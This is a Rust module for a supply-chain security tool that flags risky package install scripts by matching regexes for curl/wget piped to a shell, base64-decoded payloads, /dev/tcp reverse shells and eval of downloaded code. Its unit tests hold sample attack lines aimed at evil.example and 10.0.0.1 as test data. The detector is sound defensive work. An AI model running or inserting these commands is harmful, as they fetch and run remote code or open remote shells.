//! Static analysis of lifecycle script bodies for high-risk patterns
//! (whitepaper §7).
//!
//! The detector is intentionally conservative — every pattern here is a
//! near-unambiguous indicator of remote-code-execution-during-install
//! tradecraft. False positives are far more expensive than false
//! negatives at the policy layer because every finding becomes a `block`
//! by default; a downstream user can demote via
//! `severity.suspicious-script: warn`.
//!
//! Patterns are matched against the raw script body as it would be
//! handed to `sh -c`. Excerpt windows are clipped to a small fixed size
//! so audit logs stay readable when scripts are obfuscated minified
//! one-liners.

use regex::Regex;
use std::sync::OnceLock;

/// Maximum number of source bytes captured around a match for the
/// `excerpt` field. Keeps audit / lock / VEX outputs bounded.
const EXCERPT_WINDOW: usize = 80;

/// One line item per (pattern, script). `pattern` is a stable
/// kebab-case identifier suitable for documentation and policy
/// override docs; `excerpt` is a short slice of the script body
/// centred on the match.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SuspiciousFinding {
    pub pattern: &'static str,
    pub excerpt: String,
}

struct PatternRule {
    id: &'static str,
    re: &'static OnceLock<Regex>,
    src: &'static str,
}

/// curl ... | sh|bash|zsh — classic remote-code-execution dropper.
static CURL_PIPE_SHELL: OnceLock<Regex> = OnceLock::new();
/// wget ... | sh|bash|zsh — same family.
static WGET_PIPE_SHELL: OnceLock<Regex> = OnceLock::new();
/// `base64 -d|--decode|-D` piped into a shell or `eval` — used to
/// smuggle the real payload past visual inspection.
static BASE64_DECODE_PIPE: OnceLock<Regex> = OnceLock::new();
/// Bash `/dev/tcp/<host>/<port>` reverse-shell idiom.
static DEV_TCP_REVERSE_SHELL: OnceLock<Regex> = OnceLock::new();
/// `eval $(...)` of a network-fetched payload (curl/wget inside the
/// command substitution).
static EVAL_NETWORK: OnceLock<Regex> = OnceLock::new();

static RULES: &[PatternRule] = &[
    PatternRule {
        id: "curl-pipe-shell",
        re: &CURL_PIPE_SHELL,
        src: r"curl\b[^|;&]*\|\s*(?:sh|bash|zsh|ksh)\b",
    },
    PatternRule {
        id: "wget-pipe-shell",
        re: &WGET_PIPE_SHELL,
        src: r"wget\b[^|;&]*\|\s*(?:sh|bash|zsh|ksh)\b",
    },
    PatternRule {
        id: "base64-decode-pipe",
        re: &BASE64_DECODE_PIPE,
        // base64 -d (or --decode/-D) followed by either a pipe to a
        // shell or being captured into eval/exec.
        src: r"base64\s+(?:-d|--decode|-D)\b[^|;&]*(?:\|\s*(?:sh|bash|zsh|ksh)|\s*\)\s*(?:\||;)?\s*(?:eval|exec))",
    },
    PatternRule {
        id: "dev-tcp-reverse-shell",
        re: &DEV_TCP_REVERSE_SHELL,
        src: r"/dev/(?:tcp|udp)/[^/]+/\d+",
    },
    PatternRule {
        id: "eval-network-payload",
        re: &EVAL_NETWORK,
        // eval $( ... curl|wget ... ) — captures the common
        // "download then evaluate" idiom regardless of pipe shape.
        src: r"\beval\b[^)]*\$\([^)]*\b(?:curl|wget|fetch)\b",
    },
];

/// Returns one finding per matched rule. Each rule fires at most once
/// per script body even if it matches multiple times, because the
/// remediation (audit the script) is identical in either case and
/// duplicate findings would just bloat audit logs.
#[must_use]
pub fn scan(body: &str) -> Vec<SuspiciousFinding> {
    let mut out = Vec::new();
    for rule in RULES {
        let re = rule.re.get_or_init(|| {
            Regex::new(rule.src).expect("script_scan: built-in regex must compile")
        });
        if let Some(m) = re.find(body) {
            out.push(SuspiciousFinding {
                pattern: rule.id,
                excerpt: clip_excerpt(body, m.start(), m.end()),
            });
        }
    }
    out
}

/// Clip a window of `EXCERPT_WINDOW` bytes around `[start, end)`,
/// trimming whitespace and prefixing/suffixing `…` when the script
/// extended past the window. Falls back to char boundaries to avoid
/// slicing a multi-byte UTF-8 codepoint mid-sequence.
fn clip_excerpt(body: &str, start: usize, end: usize) -> String {
    let pad = EXCERPT_WINDOW.saturating_sub(end - start) / 2;
    let lo = floor_char_boundary(body, start.saturating_sub(pad));
    let hi = ceil_char_boundary(body, (end + pad).min(body.len()));
    let slice = &body[lo..hi];
    let trimmed = slice.trim();
    let mut s = String::new();
    if lo > 0 {
        s.push('…');
    }
    s.push_str(trimmed);
    if hi < body.len() {
        s.push('…');
    }
    s
}

fn floor_char_boundary(s: &str, mut i: usize) -> usize {
    while i > 0 && !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

fn ceil_char_boundary(s: &str, mut i: usize) -> usize {
    while i < s.len() && !s.is_char_boundary(i) {
        i += 1;
    }
    i
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(findings: &[SuspiciousFinding]) -> Vec<&'static str> {
        findings.iter().map(|f| f.pattern).collect()
    }

    #[test]
    fn curl_pipe_shell_matches() {
        let s = scan("curl https://evil.example/install.sh | sh");
        assert_eq!(ids(&s), vec!["curl-pipe-shell"]);
        assert!(s[0].excerpt.contains("curl"));
    }

    #[test]
    fn wget_pipe_bash_matches() {
        let s = scan("wget -qO- https://evil.example/x | bash -s");
        assert_eq!(ids(&s), vec!["wget-pipe-shell"]);
    }

    #[test]
    fn base64_decode_to_shell_matches() {
        let s = scan("echo Zm9v | base64 -d | sh");
        assert_eq!(ids(&s), vec!["base64-decode-pipe"]);
    }

    #[test]
    fn dev_tcp_reverse_shell_matches() {
        let s = scan("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert_eq!(ids(&s), vec!["dev-tcp-reverse-shell"]);
    }

    #[test]
    fn eval_network_payload_matches() {
        let s = scan("eval $(curl -fsSL https://evil.example/p)");
        assert_eq!(ids(&s), vec!["eval-network-payload"]);
    }

    #[test]
    fn benign_scripts_have_no_findings() {
        // The typical install-time scripts seen in real packages.
        for body in [
            "node ./scripts/install.js",
            "tsc -p .",
            "node-gyp rebuild",
            "echo 'hello'",
            "test -f dist/index.js || npm run build",
            // curl present but not piped to a shell.
            "curl https://example.com -o file.tgz",
        ] {
            let s = scan(body);
            assert!(s.is_empty(), "expected no findings for {body:?}, got {s:?}");
        }
    }

    #[test]
    fn each_rule_fires_at_most_once_per_script() {
        let body = "curl a | sh; curl b | bash";
        let s = scan(body);
        assert_eq!(s.len(), 1);
    }

    #[test]
    fn multiple_rules_can_fire_for_one_script() {
        let body = "curl https://x | sh && bash -i >& /dev/tcp/h/9 0>&1";
        let mut got = ids(&scan(body));
        got.sort_unstable();
        assert_eq!(got, vec!["curl-pipe-shell", "dev-tcp-reverse-shell"]);
    }

    #[test]
    fn excerpt_is_bounded_and_utf8_safe() {
        let body = format!("{}curl https://x | sh{}", "💣".repeat(50), "🔥".repeat(50));
        let s = scan(&body);
        assert_eq!(s.len(), 1);
        // No panic on slicing through emoji boundaries.
        assert!(s[0].excerpt.contains("curl"));
        assert!(s[0].excerpt.starts_with('…'));
        assert!(s[0].excerpt.ends_with('…'));
    }
}
